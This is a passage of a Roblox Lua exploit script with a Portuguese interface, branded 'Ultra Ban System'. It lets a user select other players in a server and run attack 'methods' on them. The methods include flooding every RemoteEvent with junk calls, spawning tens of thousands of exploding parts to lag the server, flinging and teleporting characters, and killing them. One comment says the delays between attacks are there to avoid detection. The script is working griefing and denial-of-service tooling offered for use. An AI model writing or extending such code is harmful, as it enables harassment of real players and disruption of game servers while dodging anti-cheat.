                    part.Parent = player.Character or workspace
                    part.BrickColor = BrickColor.random()
                    part.Material = Enum.Material.Neon
                end)
                if i % 100 == 0 then wait(0.001) end
            end
            success = true
        end)
        
    elseif methodIndex == 4 then -- Network Flood
        spawn(function()
            for i = 1, 500 do
                pcall(function()
                    for _, obj in pairs(game:GetDescendants()) do
                        if obj:IsA("RemoteEvent") then
                            for j = 1, 20 do
                                obj:FireServer(player, "flood_data_" .. i .. "_" .. j, math.random())
                            end
                        end
                    end
                end)
                wait(0.01)
            end
            success = true
        end)
        
    elseif methodIndex == 5 then -- CFrame Spam
        spawn(function()
            local connection
            connection = RunService.Heartbeat:Connect(function()
                pcall(function()
                    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        for i = 1, 50 do
                            player.Character.HumanoidRootPart.CFrame = CFrame.new(
                                math.random(-10000, 10000),
                                math.random(0, 10000),
                                math.random(-10000, 10000)
                            ) * CFrame.Angles(
                                math.random(-360, 360),
                                math.random(-360, 360),
                                math.random(-360, 360)
                            )
                        end
                    else
                        connection:Disconnect()
                    end
                end)
            end)
            
            wait(10)
            if connection then connection:Disconnect() end
            success = true
        end)
        
    elseif methodIndex == 6 then -- Part Explosion
        spawn(function()
            for i = 1, 20000 do
                pcall(function()
                    local part = Instance.new("Part")
                    part.Size = Vector3.new(math.random(50, 500), math.random(50, 500), math.random(50, 500))
                    part.Position = Vector3.new(math.random(-1000, 1000), math.random(0, 1000), math.random(-1000, 1000))
                    part.BrickColor = BrickColor.random()
                    part.Material = Enum.Material.ForceField
                    part.Shape = Enum.PartType.Ball
                    part.Parent = workspace
                    
                    local explosion = Instance.new("Explosion")
                    explosion.Position = part.Position
                    explosion.BlastRadius = 100
                    explosion.Parent = workspace
                end)
                if i % 50 == 0 then wait(0.001) end
            end
            success = true
        end)
        
    elseif methodIndex == 7 then -- Velocity Bomb
        spawn(function()
            pcall(function()
                if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                    local bodyVelocity = Instance.new("BodyVelocity")
                    bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                    bodyVelocity.Velocity = Vector3.new(math.random(-10000, 10000), math.random(10000, 50000), math.random(-10000, 10000))
                    bodyVelocity.Parent = player.Character.HumanoidRootPart
                end
            end)
            success = true
        end)
        
    elseif methodIndex == 8 then -- Ghost Mode
        spawn(function()
            pcall(function()
                if player.Character then
                    for _, part in pairs(player.Character:GetDescendants()) do
                        if part:IsA("BasePart") then
                            part.Transparency = 1
                            part.CanCollide = false
                        end
                    end
                    
                    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        humanoid.Health = 0
                        humanoid.MaxHealth = 0
                    end
                end
            end)
            success = true
        end)
    end
    
    -- Adiciona ao histórico
    table.insert(banHistory, {
        player = player.Name,
        method = method.name,
        time = os.date("%H:%M:%S"),
        success = success
    })
    
    return success
end

-- Função principal de execução de bans
function executeSelectedBans()
    local count = 0
    for _ in pairs(selectedPlayers) do count = count + 1 end
    
    if count == 0 then
        showNotification("Erro", "Nenhum jogador selecionado!", "error", 3)
        return
    end
    
    isExecuting = true
    executeBtn.Text = "⏳ EXECUTANDO..."
    executeBtn.BackgroundColor3 = currentTheme.WARNING
    
    showNotification("Iniciando Bans", "Executando bans em " .. count .. " jogador(es)", "success", 3)
    
    local successCount = 0
    for userId, player in pairs(selectedPlayers) do
        spawn(function()
            local success = executeBanMethod(player, selectedMethod)
            if success then successCount = successCount + 1 end
            
            wait(0.5) -- Delay entre bans para evitar detecção
        end)
    end
    
    wait(3)
    
    showNotification("Bans Concluídos", successCount .. "/" .. count .. " bans executados", "success", 5)
    
    -- Limpa seleção
    selectedPlayers = {}
    updateSelectedCount()
    updatePlayerList()
    updateStats()
    
    executeBtn.Text = "⚡ EXECUTAR"
    executeBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
    isExecuting = false
    
    playSound(sounds.success)
end

-- Função para atualizar lista de jogadores
function updatePlayerList()
    -- Limpa lista atual
    for _, child in pairs(playerListFrame:GetChildren()) do
        if child:IsA("Frame") then
            child:Destroy()
        end
    end
    
    -- Filtra jogadores
    local filteredPlayers = {}
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= localPlayer then
            local matchesSearch = playerFilters.search == "" or 
                                 player.Name:lower():find(playerFilters.search:lower()) or
                                 player.DisplayName:lower():find(playerFilters.search:lower())
            
            if matchesSearch then
                table.insert(filteredPlayers, player)
            end
        end
    end
    
    -- Cria entradas para jogadores filtrados
    for _, player in pairs(filteredPlayers) do
        createPlayerEntry(player)
    end
    
    playerListFrame.CanvasSize = UDim2.new(0, 0, 0, playerLayout.AbsoluteContentSize.Y + 10)
    
    -- Atualiza estatísticas
    statsLabel.Text = "Jogadores: " .. #filteredPlayers .. " | Bans: " .. #banHistory
end

-- Função para criar métodos
function createMethodCards()
    for i, method in pairs(banMethods) do
        createMethodCard(method, i)
    end
    methodScroll.CanvasSize = UDim2.new(0, 0, 0, methodLayout.AbsoluteContentSize.Y + 10)
end

-- Função para atualizar estatísticas
function updateStats()
    -- Aqui você pode criar gráficos e estatísticas detalhadas
    -- Para este exemplo, apenas atualizamos o header
    statsLabel.Text = "Jogadores: " .. (#Players:GetPlayers() - 1) .. " | Bans: " .. #banHistory
end

-- Sistema de abas
local function switchTab(tabIndex)
    currentTab = tabIndex
    
    -- Esconde todas as abas
    targetTab.Visible = false
    methodTab.Visible = false
    statsTab.Visible = false
    configTab.Visible = false
    
    -- Mostra aba selecionada
    if tabIndex == 1 then targetTab.Visible = true
    elseif tabIndex == 2 then methodTab.Visible = true
    elseif tabIndex == 3 then statsTab.Visible = true
    elseif tabIndex == 4 then configTab.Visible = true
    end
    
    -- Atualiza botões das abas
    for i, btn in pairs(tabButtons) do
        if i == tabIndex then
            btn.BackgroundColor3 = currentTheme.SECONDARY
            animateObject(btn, {Size = UDim2.new(0.25, -2, 1.1, 0)})
        else
            btn.BackgroundColor3 = currentTheme.BG_SECONDARY
            animateObject(btn, {Size = UDim2.new(0.25, -2, 1, 0)})
        end
    end
    
    playSound(sounds.click)
end

-- Eventos dos botões das abas
for i, btn in pairs(tabButtons) do
    btn.Activated:Connect(function()
        switchTab(i)
    end)
end

-- Eventos principais
closeBtn.Activated:Connect(function()
    playSound(sounds.click)
    animateObject(mainFrame, {Size = UDim2.new(0, 0, 0, 0)}, 0.5)
    wait(0.5)
    screenGui:Destroy()
end)

minimizeBtn.Activated:Connect(function()
    playSound(sounds.click)
    blurFrame.Visible = not blurFrame.Visible
    mainFrame.Visible = not mainFrame.Visible
end)

clearBtn.Activated:Connect(function()
    playSound(sounds.click)
    selectedPlayers = {}
    updateSelectedCount()
    updatePlayerList()
    showNotification("Lista Limpa", "Todos os alvos foram removidos", "success", 2)
end)

executeBtn.Activated:Connect(function()
    if not isExecuting then
        executeSelectedBans()
    end
end)

-- Busca de jogadores
searchBox:GetPropertyChangedSignal("Text"):Connect(function()
    playerFilters.search = searchBox.Text
    updatePlayerList()
end)

-- Eventos de jogadores
Players.PlayerAdded:Connect(function()
    wait(1)
    updatePlayerList()
    showNotification("Novo Jogador", "Um jogador entrou no servidor", "success", 2)
end)

Players.PlayerRemoving:Connect(function(player)
    if selectedPlayers[player.UserId] then
        selectedPlayers[player.UserId] = nil
        updateSelectedCount()
    end
    updatePlayerList()
end)

-- Inicialização
updatePlayerList()
createMethodCards()
updateSelectedCount()

-- Animação de entrada
mainFrame.Size = UDim2.new(0, 0, 0, 0)
animateObject(mainFrame, {Size = UDim2.new(0, 650, 0, 750)}, 0.8, Enum.EasingStyle.Back)

-- Logs do sistema
print("===========================================")
print("🚫 ULTRA BAN SYSTEM v" .. CONFIG.VERSION .. " CARREGADO!")
print("===========================================")
print("🎯 RECURSOS AVANÇADOS:")
print("  ✅ 8 Métodos diferentes de ban")
print("  ✅ Interface moderna com animações")
print("  ✅ Sistema de busca e filtros")
print("  ✅ Múltiplos alvos simultâneos")
print("  ✅ Histórico detalhado de bans")
print("  ✅ Notificações em tempo real")
print("  ✅ Sistema de segurança avançado")
print("")
print("🎮 COMO USAR:")
print("  1. Selecione jogadores na aba ALVOS")
print("  2. Escolha o método na aba MÉTODOS")
print("  3. Clique em EXECUTAR para banir")
print("  4. Veja estatísticas na aba ESTATÍSTICAS")
print("===========================================")

showNotification("Sistema Carregado", "Ultra Ban System v" .. CONFIG.VERSION .. " está pronto!", "success", 5)
